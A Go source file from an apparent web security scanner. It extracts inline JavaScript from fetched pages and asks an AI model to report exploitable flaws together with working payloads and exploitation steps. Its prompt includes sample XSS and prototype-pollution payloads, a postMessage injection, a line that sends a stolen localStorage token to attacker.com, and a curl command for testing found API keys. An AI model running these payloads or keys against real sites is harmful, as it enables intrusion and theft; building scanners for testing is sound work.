package analysis

import (
	"context"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"net/http"
	"regexp"
	"strings"

	"banshee/internal/app/console"
	"banshee/internal/app/core"
)

// ========== INLINE CODE ANALYSIS ==========

// shouldExcludeURLForCodeAnalysis checks if a URL should be excluded from inline code analysis
func shouldExcludeURLForCodeAnalysis(urlStr string) bool {
	urlLower := strings.ToLower(urlStr)

	// Excluded file extensions
	excludedExtensions := []string{
		".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
		".pdf", ".zip", ".rar", ".gz", ".woff", ".woff2", ".ttf",
		".eot", ".mp3", ".mp4", ".avi", ".mov", ".js", ".mjs", ".json",
	}

	for _, ext := range excludedExtensions {
		if strings.HasSuffix(urlLower, ext) {
			return true
		}
	}

	// Excluded paths
	excludedPaths := []string{
		"/vendor/", "/static/", "/assets/", "/api/", "/uploads/",
		"/media/", "/files/", "/storage/", "/auth/", "/oauth/",
		"/cdn/", "/analytics/", "/tagmanager/", "/tracking/", "/ads/",
	}

	for _, path := range excludedPaths {
		if strings.Contains(urlLower, path) {
			return true
		}
	}

	return false
}

// extractInlineJavaScript extracts all inline JavaScript from HTML content
func extractInlineJavaScript(htmlContent string) string {
	var jsSnippets []string
	var commentSnippets []string

	// Pattern 1: <script>...</script> tags (not external scripts, and skip non-JS types)
	scriptPattern := regexp.MustCompile(`(?is)<script([^>]*)>(.*?)</script>`)
	matches := scriptPattern.FindAllStringSubmatch(htmlContent, -1)

	for _, match := range matches {
		if len(match) > 2 {
			attrs := strings.ToLower(match[1])
			// Skip external scripts
			if strings.Contains(attrs, "src=") {
				continue
			}
			// Skip non-JS types (json, ld+json, etc.)
			if typeIdx := strings.Index(attrs, "type="); typeIdx != -1 {
				// naive parse of type attribute
				typeVal := attrs[typeIdx:]
				if sp := strings.IndexAny(typeVal, " >"); sp != -1 {
					typeVal = typeVal[:sp]
				}
				typeVal = strings.Trim(typeVal, `"'= `)
				if strings.Contains(typeVal, "json") {
					continue
				}
				allowedTypes := []string{"", "text/javascript", "application/javascript", "application/x-javascript", "module"}
				ok := false
				for _, a := range allowedTypes {
					if typeVal == a {
						ok = true
						break
					}
				}
				if !ok {
					continue
				}
			}
			jsCode := strings.TrimSpace(match[2])
			// Skip empty scripts or those that are just comments
			if jsCode != "" && !strings.HasPrefix(jsCode, "<!--") {
				if filtered := filterJSForVuln(jsCode); filtered != "" {
					jsSnippets = append(jsSnippets, filtered)
				}
			}
		}
	}

	// Pattern 2: Event handlers (onclick, onload, etc.)
	eventHandlerPattern := regexp.MustCompile(`(?i)on(?:click|load|error|mouseover|mouseout|submit|change|focus|blur|keyup|keydown)=["']([^"']+)["']`)
	matches = eventHandlerPattern.FindAllStringSubmatch(htmlContent, -1)

	for _, match := range matches {
		if len(match) > 1 {
			jsCode := strings.TrimSpace(html.UnescapeString(match[1]))
			if jsCode != "" {
				if filtered := filterJSForVuln(jsCode); filtered != "" {
					jsSnippets = append(jsSnippets, "// Event handler:\n"+filtered)
				}
			}
		}
	}

	// Pattern 3: HTML comments that may contain sensitive hints
	commentPattern := regexp.MustCompile(`(?s)<!--(.*?)-->`)
	for _, match := range commentPattern.FindAllStringSubmatch(htmlContent, -1) {
		if len(match) > 1 {
			comment := strings.TrimSpace(match[1])
			if comment != "" {
				if filtered := filterJSForVuln(comment); filtered != "" {
					commentSnippets = append(commentSnippets, "// HTML comment:\n"+filtered)
				}
			}
		}
	}

	// Pattern 3: javascript: protocol in hrefs
	hrefPattern := regexp.MustCompile(`(?i)href=["']javascript:([^"']+)["']`)
	matches = hrefPattern.FindAllStringSubmatch(htmlContent, -1)

	for _, match := range matches {
		if len(match) > 1 {
			jsCode := strings.TrimSpace(html.UnescapeString(match[1]))
			if jsCode != "" {
				if filtered := filterJSForVuln(jsCode); filtered != "" {
					jsSnippets = append(jsSnippets, "// JavaScript href:\n"+filtered)
				}
			}
		}
	}

	combined := append(jsSnippets, commentSnippets...)
	if len(combined) == 0 {
		return ""
	}

	joined := strings.Join(combined, "\n\n// ===== Next Script =====\n\n")

	// Fallback: if the filtered content is too small, include raw inline scripts for broader coverage
	if len(joined) < 500 {
		rawScriptPattern := regexp.MustCompile(`(?is)<script[^>]*>(.*?)</script>`)
		rawMatches := rawScriptPattern.FindAllStringSubmatch(htmlContent, -1)
		for _, m := range rawMatches {
			if len(m) > 1 {
				raw := strings.TrimSpace(m[1])
				if raw != "" {
					combined = append(combined, raw)
				}
			}
		}
		joined = strings.Join(combined, "\n\n// ===== Next Script =====\n\n")
	}

	// Secondary fallback: if still tiny, add stripped body text for context
	if len(joined) < 500 {
		bodyRegex := regexp.MustCompile(`(?is)<body[^>]*>(.*?)</body>`)
		bodyMatch := bodyRegex.FindStringSubmatch(htmlContent)
		body := ""
		if len(bodyMatch) > 1 {
			body = bodyMatch[1]
		} else {
			body = htmlContent
		}
		tagStripper := regexp.MustCompile(`(?s)<[^>]+>`)
		bodyText := strings.TrimSpace(tagStripper.ReplaceAllString(body, " "))
		if len(bodyText) > 1000 {
			bodyText = bodyText[:1000]
		}
		if bodyText != "" {
			joined = joined + "\n\n// ===== Fallback Body Text =====\n" + bodyText
		}
	}

	// Cap total inline JS sent to AI to save quota; focus on most suspicious parts only
	const maxInlineJSChars = 12000
	if len(joined) > maxInlineJSChars {
		joined = joined[:maxInlineJSChars] + "\n\n// [truncated to save AI quota]"
	}

	return joined
}

// filterJSForVuln keeps only lines/functions likely to be sensitive/vulnerable (or returns full code if nothing matches)
func filterJSForVuln(js string) string {
	lines := strings.Split(js, "\n")
	suspiciousKeywords := []string{
		// DOM XSS sinks
		"eval", "innerhtml", "outerhtml", "document.write", "document.writeln",
		"insertadjacenthtml", "settimeout", "setinterval", "function(",

		// DOM XSS sources
		"location.hash", "location.search", "location.href", "document.url", "document.referrer",
		"urlsearchparams", "getparameter", "window.name",

		// postMessage vulnerabilities
		"postmessage", "addeventlistener", "event.data", "event.origin", "message",

		// Prototype pollution
		"prototype", "__proto__", "constructor.prototype", "[", "merge(", "extend(",
		"object.assign", "deepmerge",

		// Storage leaks
		"localstorage", "sessionstorage", "setitem", "getitem",
		"localstorage.setitem", "sessionstorage.setitem",

		// Secrets
		"apikey", "api_key", "secret", "token", "password", "credential",
		"sk_live", "pk_live", "akia", "ghp_", "client_secret", "aws_secret",
		"bearer", "jwt", "authorization",
	}
	commentKeywords := []string{
		"token", "secret", "key", "api", "api_key", "client_id", "auth", "bearer", "credential",
		"password", "pwd", "endpoint", "url", "internal", "todo", "hack", "bypass", "debug",
		"sk_live", "pk_live", "akia", "ghp_", "aws", "database", "db_password",
	}

	var kept []string
	for _, line := range lines {
		trim := strings.TrimSpace(line)
		lower := strings.ToLower(trim)
		if trim == "" {
			continue
		}

		isComment := strings.HasPrefix(trim, "//") || strings.HasPrefix(trim, "/*") || strings.HasPrefix(trim, "*")
		if isComment {
			for _, kw := range commentKeywords {
				if strings.Contains(lower, kw) {
					kept = append(kept, trim)
					break
				}
			}
			continue
		}

		for _, kw := range suspiciousKeywords {
			if strings.Contains(lower, kw) {
				kept = append(kept, trim)
				break
			}
		}
	}

	if len(kept) == 0 {
		return strings.TrimSpace(js)
	}
	return strings.Join(kept, "\n")
}

// analyzeInlineJavaScript analyzes extracted JavaScript (including inline comments) for security vulnerabilities and sensitive data
func (c *Config) analyzeInlineJavaScript(ctx context.Context, url string, jsCode string) (string, error) {
	if jsCode == "" {
		return "", nil
	}

	// Prepare AI prompt for JavaScript security analysis (5 high-value types AI can reliably detect)
	systemPrompt := `You are an expert JavaScript security auditor. Report ONLY these 5 HIGH-CONFIDENCE vulnerability types:

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. DOM-BASED XSS (Only with CLEAR source→sink flow)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SOURCES (attacker-controlled):
  • location.hash, location.search, location.href, document.URL, document.referrer
  • URL parameters accessed via URLSearchParams, getParameter(), etc.

SINKS (dangerous):
  • element.innerHTML, element.outerHTML
  • document.write(), document.writeln()
  • eval(), setTimeout(string), setInterval(string), Function(string)
  • element.insertAdjacentHTML()

REQUIREMENTS:
  - Must show COMPLETE data flow: source → [processing] → sink
  - Provide WORKING XSS payload (e.g., <img src=x onerror=alert(document.domain)>)
  - Generate FULL PoC URL that demonstrates the vulnerability

EXAMPLE OUTPUT:
  "poc_url": "https://site.com/page?search=<img src=x onerror=alert(1)>",
  "payload": "<img src=x onerror=alert(1)>",
  "how_to_exploit": "Open the PoC URL in browser - XSS will execute immediately"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
2. POSTMESSAGE VULNERABILITIES (Missing origin validation)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PATTERN:
  window.addEventListener('message', function(event) {
    // VULNERABLE: No origin check!
    doSomethingDangerous(event.data);
  });

REQUIREMENTS:
  - addEventListener('message') exists
  - NO origin validation (missing: if (event.origin !== 'https://trusted.com') return;)
  - Data is used in dangerous way (eval, innerHTML, etc.)

EXAMPLE OUTPUT:
  "poc_url": "https://attacker.com/poc.html → opens iframe to vulnerable site → sends postMessage",
  "payload": "parent.postMessage({cmd:'inject',data:'<script>alert(1)</script>'}, '*')",
  "how_to_exploit": "Create HTML: <iframe src='https://victim.com'></iframe><script>frames[0].postMessage('payload','*')</script>"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
3. PROTOTYPE POLLUTION (Unsafe object property assignment)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PATTERN:
  obj[userInput] = value  // NO CHECK if userInput === '__proto__'
  merge(target, source)   // Unsafe deep merge
  obj.constructor.prototype.polluted = true

REQUIREMENTS:
  - User can control property name
  - No check for __proto__, constructor, prototype
  - Can set arbitrary properties on Object.prototype

EXAMPLE OUTPUT:
  "poc_url": "https://site.com/api/config?__proto__[isAdmin]=true",
  "payload": "__proto__[isAdmin]=true",
  "how_to_exploit": "Send request to API with __proto__ in parameter → all objects inherit isAdmin=true"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
4. HARDCODED SECRETS (API keys, credentials, tokens)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PATTERNS:
  const API_KEY = "sk_live_4eC39HqLyjWDarjtT1zdp7dc"
  aws_access_key_id = "AKIAIOSFODNN7EXAMPLE"
  const token = "ghp_16C7e42F292c6912E7710c838347Ae178B4a"
  // password: admin123

INCLUDE ONLY:
  ✅ Private API keys (sk_live_, pk_live_, api_key_, apiKey)
  ✅ AWS credentials (AKIA, aws_secret_access_key)
  ✅ GitHub tokens (ghp_, gho_, github_token)
  ✅ Database credentials (db_password, mysql_pass)
  ✅ Private keys (BEGIN PRIVATE KEY, BEGIN RSA)
  ✅ OAuth secrets (client_secret, consumer_secret)
  ✅ Hardcoded passwords in code or comments

EXCLUDE:
  ❌ CSRF tokens (sesskey, _token, X-CSRF-TOKEN)
  ❌ Public client IDs (client_id in OAuth is often public)
  ❌ Framework config (M.cfg, window.config)
  ❌ Placeholder values ("YOUR_API_KEY_HERE", "xxx", "test123")

EXAMPLE OUTPUT:
  "poc_url": "View page source → search for 'sk_live_' → copy API key",
  "payload": "sk_live_4eC39HqLyjWDarjtT1zdp7dc",
  "how_to_exploit": "API key found in source. Test with: curl -H 'Authorization: Bearer sk_live_...' https://api.stripe.com/v1/charges"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
5. LOCALSTORAGE/SESSIONSTORAGE SENSITIVE DATA
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PATTERN:
  localStorage.setItem('authToken', token)
  sessionStorage.setItem('jwt', jwtToken)
  localStorage.password = userPassword

SENSITIVE DATA:
  • JWT tokens, session tokens, auth tokens
  • Passwords, credentials
  • Personal identifiable information (PII)

REQUIREMENTS:
  - Sensitive data stored in localStorage/sessionStorage
  - Accessible via XSS or physical access
  - Not encrypted or protected

EXAMPLE OUTPUT:
  "poc_url": "Open DevTools → Application → Local Storage → view stored JWT token",
  "payload": "localStorage.getItem('authToken')",
  "how_to_exploit": "Inject XSS: <script>fetch('https://attacker.com/steal?token='+localStorage.authToken)</script>"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CRITICAL RULES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❌ DO NOT report:
  • Analytics/tracking code (Google Analytics, Facebook Pixel)
  • Framework boilerplate (React, Angular, Vue initialization)
  • Help text or documentation in comments
  • Open redirects in tracking functions (trackOutboundLink, gtag, etc.)
  • Password strength checkers (e.g., "family name as password" help text)
  • Low/medium confidence findings - ONLY HIGH CONFIDENCE

✅ ONLY report if:
  • 100% certain it's exploitable
  • Can provide WORKING PoC URL or payload
  • Clear, actionable exploitation steps

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
OUTPUT FORMAT (strict JSON, no markdown)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Return empty object if no HIGH-CONFIDENCE findings:
{}

OR return findings:
{
  "vulnerabilities": [
    {
      "type": "DOM-XSS|postMessage|Prototype Pollution|Hardcoded Secret|localStorage Leak",
      "confidence": "high",
      "parameter": "Vulnerable parameter/function name",
      "payload": "Working exploit payload",
      "poc_url": "Full PoC URL or step-by-step HTML/JavaScript",
      "how_to_exploit": "Clear 1-2 sentence exploitation guide",
      "snippet": "Evidence code (max 150 chars)",
      "line": "Approximate line number or 'inline'"
    }
  ]
}

IMPORTANT: "line" can be string OR number. Use "inline" if unknown.`

	userPrompt := fmt.Sprintf("URL: %s\nInline JavaScript and comments:\n%s", url, jsCode)

	// Call AI model
	analysisResult, err := c.callGeminiCLIWithLargeData(ctx, systemPrompt, userPrompt)
	if err != nil {
		return "", fmt.Errorf("AI analysis failed: %v", err)
	}

	// Clean up JSON (remove markdown code blocks if present)
	analysisResult = strings.TrimSpace(analysisResult)
	if strings.Contains(analysisResult, "```json") {
		start := strings.Index(analysisResult, "```json") + 7
		end := strings.Index(analysisResult[start:], "```")
		if end > 0 {
			analysisResult = strings.TrimSpace(analysisResult[start : start+end])
		}
	} else if strings.Contains(analysisResult, "```") {
		start := strings.Index(analysisResult, "```") + 3
		end := strings.Index(analysisResult[start:], "```")
		if end > 0 {
			analysisResult = strings.TrimSpace(analysisResult[start : start+end])
		}
	}

	// Check if response is empty or just "{}"
	if analysisResult == "" || analysisResult == "{}" || analysisResult == "{ }" {
		return "", nil // No vulnerabilities found
	}

	return analysisResult, nil
}

// InlineCodeAnalysisStats holds statistics for inline code analysis
type InlineCodeAnalysisStats struct {
	TotalURLs     int
	ScannedURLs   int
	FindingsCount int
}

// performInlineCodeAnalysis performs inline JavaScript analysis on collected URLs
func (c *Config) performInlineCodeAnalysis(ctx context.Context, urls []string) *InlineCodeAnalysisStats {
	stats := &InlineCodeAnalysisStats{
		TotalURLs: len(urls),
	}

	if !c.InlineCodeAnalysis || len(urls) == 0 {
		return stats
	}

	console.Logv(c.Verbose, "\n%s[INLINE-CODE-ANALYSIS]%s Analyzing inline JavaScript from %d URLs...", console.ColorCyan, console.ColorReset, len(urls))

	findingsCount := 0
	processedCount := 0

	for _, urlStr := range urls {
		if ctx.Err() != nil {
			console.Logv(c.Verbose, "%s[INLINE-CODE-ANALYSIS]%s Operation cancelled", console.ColorOrange, console.ColorReset)
			stats.ScannedURLs = processedCount
			stats.FindingsCount = findingsCount
			return stats
		}

		// Check if URL should be excluded
		if shouldExcludeURLForCodeAnalysis(urlStr) {
			console.Logv(c.Verbose, "%s[INLINE-CODE-ANALYSIS]%s Skipping excluded URL: %s", console.ColorGray, console.ColorReset, urlStr)
			continue
		}

		processedCount++

		// Fetch the URL
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, urlStr, nil)
		if err != nil {
			console.Logv(c.Verbose, "%s[INLINE-CODE-ANALYSIS]%s Failed to create request for %s: %v", console.ColorRed, console.ColorReset, urlStr, err)
			continue
		}
		req.Header.Set("User-Agent", core.DefaultUserAgent)

		client, err := buildHTTPClient(c.Proxy, c.Insecure)
		if err != nil {
			console.Logv(c.Verbose, "%s[INLINE-CODE-ANALYSIS]%s Failed to build HTTP Client: %v", console.ColorRed, console.ColorReset, err)
			continue
		}

		resp, err := client.Do(req)
		if err != nil {
			console.Logv(c.Verbose, "%s[INLINE-CODE-ANALYSIS]%s Failed to fetch %s: %v", console.ColorRed, console.ColorReset, urlStr, err)
			continue
		}

		// Read response body
		bodyBytes, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			console.Logv(c.Verbose, "%s[INLINE-CODE-ANALYSIS]%s Failed to read response from %s: %v", console.ColorRed, console.ColorReset, urlStr, err)
			continue
		}

		// Check if response is HTML
		contentType := resp.Header.Get("Content-Type")
		if !strings.Contains(strings.ToLower(contentType), "html") {
			console.Logv(c.Verbose, "%s[INLINE-CODE-ANALYSIS]%s Skipping non-HTML response: %s (Content-Type: %s)", console.ColorGray, console.ColorReset, urlStr, contentType)
			continue
		}

		// Extract inline JavaScript
		jsCode := extractInlineJavaScript(string(bodyBytes))
		if jsCode == "" {
			console.Logv(c.Verbose, "%s[INLINE-CODE-ANALYSIS]%s No inline JavaScript found in %s", console.ColorGray, console.ColorReset, urlStr)
			continue
		}

		console.Logv(c.Verbose, "%s[INLINE-CODE-ANALYSIS]%s Extracted %d characters of JavaScript from %s", console.ColorCyan, console.ColorReset, len(jsCode), urlStr)

		// Analyze JavaScript with AI
		analysis, err := c.analyzeInlineJavaScript(ctx, urlStr, jsCode)
		if err != nil {
			console.Logv(c.Verbose, "%s[INLINE-CODE-ANALYSIS]%s AI analysis failed for %s: %v", console.ColorRed, console.ColorReset, urlStr, err)
			continue
		}

		if analysis == "" {
			console.Logv(c.Verbose, "%s[INLINE-CODE-ANALYSIS]%s No vulnerabilities found in %s", console.ColorGreen, console.ColorReset, urlStr)
			continue
		}

	// Parse and display results
	var result struct {
		Vulnerabilities []struct {
			Type         string      `json:"type"`
			Confidence   string      `json:"confidence"`
			Payload      string      `json:"payload"`
			Parameter    string      `json:"parameter"`
			PocURL       string      `json:"poc_url"`
			HowToExploit string      `json:"how_to_exploit"`
			Snippet      string      `json:"snippet"`
			Line         interface{} `json:"line"` // Can be string or number
		} `json:"vulnerabilities"`
	}

		if err := json.Unmarshal([]byte(analysis), &result); err != nil {
			console.Logv(c.Verbose, "%s[INLINE-CODE-ANALYSIS]%s Failed to parse AI response for %s: %v", console.ColorRed, console.ColorReset, urlStr, err)
			console.Logv(c.Verbose, "%s[INLINE-CODE-ANALYSIS]%s Raw response: %s", console.ColorGray, console.ColorReset, analysis)
			continue
		}

		// Display findings
		seen := make(map[string]struct{})
		allowedTypes := map[string]string{
			"dom-xss":                "DOM-XSS",
			"domxss":                 "DOM-XSS",
			"dom xss":                "DOM-XSS",
			"postmessage":            "postMessage",
			"postmessage vulnerability": "postMessage",
			"post message":           "postMessage",
			"prototype pollution":    "Prototype Pollution",
			"prototype":              "Prototype Pollution",
			"hardcoded secret":       "Hardcoded Secret",
			"hardcoded secrets":      "Hardcoded Secret",
			"secret":                 "Hardcoded Secret",
			"localstorage leak":      "localStorage Leak",
			"localstorage":           "localStorage Leak",
			"sessionstorage":         "localStorage Leak",
			"storage leak":           "localStorage Leak",
		}

		for _, vuln := range result.Vulnerabilities {
			// STRICT false positive filtering - ONLY HIGH confidence
			confidence := strings.ToLower(strings.TrimSpace(vuln.Confidence))
			if confidence != "high" {
				continue // Skip medium/low confidence findings
			}

			vType := strings.ToLower(strings.TrimSpace(vuln.Type))
			mappedType, ok := allowedTypes[vType]
			if !ok {
				continue // Skip unrecognized types
			}

			payload := strings.TrimSpace(vuln.Payload)
			howToExploit := strings.TrimSpace(vuln.HowToExploit)
			pocURL := strings.TrimSpace(vuln.PocURL)

			// Require BOTH payload AND exploitation guide (actionable results only)
			if payload == "" || howToExploit == "" {
				continue
			}

			findingsCount++

			// Dedupe repetitive entries (same type + parameter + payload)
			param := strings.TrimSpace(vuln.Parameter)
			key := mappedType + "|" + strings.ToLower(param) + "|" + strings.ToLower(payload)
			if _, ok := seen[key]; ok {
				findingsCount--
				continue
			}
			seen[key] = struct{}{}

			// Format evidence snippet
			snippetShort := strings.TrimSpace(vuln.Snippet)
			if len(snippetShort) > 200 {
				snippetShort = snippetShort[:197] + "..."
			}

			// Convert line field (can be string or number)
			lineInfo := "inline"
			if vuln.Line != nil {
				switch v := vuln.Line.(type) {
				case string:
					lineInfo = v
				case float64:
					lineInfo = fmt.Sprintf("line %d", int(v))
				case int:
					lineInfo = fmt.Sprintf("line %d", v)
				}
			}

			// Color coding
			typeColor := console.ColorRed     // High severity by default
			payloadColor := console.ColorYellow
			pocColor := console.ColorCyan

			// Print main finding with type and parameter
			fmt.Printf("\n%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", console.ColorCyan, console.ColorReset)
			fmt.Printf("%s[VULNERABILITY FOUND]%s %s%s%s %s(HIGH confidence)%s\n",
				console.ColorRed, console.ColorReset,
				typeColor, mappedType, console.ColorReset,
				console.ColorGreen, console.ColorReset)
			fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", console.ColorCyan, console.ColorReset)

			// URL and parameter
			fmt.Printf("%sURL:%s        %s\n", console.ColorCyan, console.ColorReset, urlStr)
			if param != "" {
				fmt.Printf("%sTarget:%s     %s\n", console.ColorCyan, console.ColorReset, param)
			}
			if lineInfo != "" {
				fmt.Printf("%sLocation:%s   %s\n", console.ColorCyan, console.ColorReset, lineInfo)
			}

			// Payload
			fmt.Printf("\n%sPAYLOAD:%s\n", console.ColorYellow, console.ColorReset)
			fmt.Printf("  %s%s%s\n", payloadColor, payload, console.ColorReset)

			// PoC URL (if provided)
			if pocURL != "" {
				fmt.Printf("\n%sPOC URL:%s\n", pocColor, console.ColorReset)
				fmt.Printf("  %s\n", pocURL)
			}

			// How to exploit (actionable steps)
			fmt.Printf("\n%sHOW TO EXPLOIT:%s\n", console.ColorGreen, console.ColorReset)
			fmt.Printf("  %s\n", howToExploit)

			// Evidence code snippet
			if snippetShort != "" {
				fmt.Printf("\n%sEVIDENCE:%s\n", console.ColorGray, console.ColorReset)
				fmt.Printf("  %s\n", snippetShort)
			}

			fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", console.ColorCyan, console.ColorReset)
		}
	}

	// Update stats
	stats.ScannedURLs = processedCount
	stats.FindingsCount = findingsCount

	// Summary
	if findingsCount > 0 {
		console.Logv(c.Verbose, "\n%s[INLINE-CODE-ANALYSIS]%s Completed. Found %d vulnerabilities in %d/%d URLs", console.ColorGreen, console.ColorReset, findingsCount, processedCount, len(urls))
	} else {
		console.Logv(c.Verbose, "\n%s[INLINE-CODE-ANALYSIS]%s Completed. No vulnerabilities found in %d URLs", console.ColorGreen, console.ColorReset, processedCount)
	}

	return stats
}
